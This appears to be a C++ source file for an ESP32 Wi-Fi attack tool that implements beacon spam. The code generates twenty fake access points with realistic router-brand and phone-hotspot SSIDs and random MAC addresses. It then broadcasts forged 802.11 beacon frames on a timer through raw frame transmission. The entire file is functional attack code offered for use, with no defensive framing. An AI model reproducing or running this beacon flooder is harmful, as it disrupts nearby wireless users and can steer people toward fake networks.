#include "Beacon.h"
#include "esp_wifi.h"
#include "esp_timer.h"

#include "core/LedManager.h"
#include "core/Logger.h"
#include "models/wifi/utils/utils.h"
#include "models/wifi/types/frame.h"

#define MAX_NETWORKS 20
#define BEACON_FRAME_COUNT 16
#define BEACON_INTERVAL_TU 100
#define BEACON_INTERVAL_US (BEACON_INTERVAL_TU * 1024)

static const char* TAG = "Wifi-Attack-Beacon";

BeaconBuffer* WifiAttackBeacon::_frame = nullptr;
esp_timer_handle_t WifiAttackBeacon::_timerHandle = nullptr;

void WifiAttackBeacon::start(uint8_t channel) {
    generateFrames(channel);

    wifi::turnModeAPSTA();

	esp_wifi_set_promiscuous(true);
    wifi::wifiFilterFrameTypes(true, true, false);

    const esp_timer_create_args_t timerArgs = {
        .callback = &sendBeacons,
        .arg = (void *) nullptr,
    };

    esp_timer_create(&timerArgs, &_timerHandle);
    esp_timer_start_periodic(_timerHandle, BEACON_INTERVAL_US);
    
    LedManager::setStatus(LedStatus::Info);
	LOG_I(TAG, "Getting started");
}

void WifiAttackBeacon::stop() {
    esp_timer_stop(_timerHandle);
    esp_timer_delete(_timerHandle);

    esp_wifi_set_promiscuous(false);
	esp_wifi_set_promiscuous_rx_cb(nullptr);

    wifi::disableModeAPSTA();

    delete[] _frame;
    _frame = nullptr;

    LedManager::setStatus(LedStatus::Successful);
	LOG_I(TAG, "Work stoppage");
}

void WifiAttackBeacon::generateFrames(uint8_t channel) { 
    _frame = new BeaconBuffer[MAX_NETWORKS];
    
    BeaconNetwork networks;

    for (int i = 0; i < MAX_NETWORKS; i++) {
        networks.ssid = generateRandomSSID();
        networks.channel = channel;
        generateRandomMac(networks.bssid);
        generateBeaconFrame(&networks, &_frame[i]);
    }

    LOG_I(TAG, "Generate frames");
}


String WifiAttackBeacon::generateRandomSSID() {
    const char* router_brands[] = {
        "TP-Link", "ASUS", "Keenetic", "Tenda", "Netgear", 
        "D-Link", "Xiaomi", "Huawei", "Home-WiFi", "Guest-Net",
        "iPhone", "AndroidAP", "Linksys", "RT-Select"
    };
    const int brandsCount = sizeof(router_brands) / sizeof(router_brands[0]);
    const char* hexCharset = "0123456789ABCDEF";

    String ssid = String(router_brands[random(0, brandsCount)]);

    if (random(0, 2) == 0) {
        ssid += "-";
    } else {
        ssid += "_";
    }
    for (int i = 0; i < 4; i++) {
        ssid += hexCharset[random(0, 16)];
    }
    if (random(0, 4) == 0) {
        ssid += "_5G";
    }

    return ssid;          
}

void WifiAttackBeacon::generateRandomMac(uint8_t* mac) { 
    mac[0] = 0x02;
    for (int i = 1; i < 6; i++) mac[i] = random(0, 256);            
}

void WifiAttackBeacon::sendBeacons(void *arg){
    for (int i = 0; i < MAX_NETWORKS; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &_frame[i].data, _frame[i].size, true);
    }
}

void WifiAttackBeacon::generateBeaconFrame(BeaconNetwork* network, BeaconBuffer* buffer){
    BeaconHeader beaconFrame;

    memcpy(beaconFrame.src, network->bssid, 6);
    memcpy(beaconFrame.bssid, network->bssid, 6);
    beaconFrame.timestamp = micros();

    size_t ssidLen = network->ssid.length();
    if (ssidLen > 32) ssidLen = 32;
    beaconFrame.tag_ssid_len = ssidLen;

    buffer->size = 0;

    memcpy(buffer->data, &beaconFrame, sizeof(BeaconHeader));
    buffer->size += sizeof(BeaconHeader);

    memcpy(buffer->data + buffer->size, network->ssid.c_str(), ssidLen);
    buffer->size += ssidLen;

    buffer->data[buffer->size++] = 1;    
    buffer->data[buffer->size++] = 4;   
    buffer->data[buffer->size++] = 0x82; 
    buffer->data[buffer->size++] = 0x84; 
    buffer->data[buffer->size++] = 0x8B; 
    buffer->data[buffer->size++] = 0x96; 

    buffer->data[buffer->size++] = 3;    
    buffer->data[buffer->size++] = 1;    
    buffer->data[buffer->size++] = network->channel;
}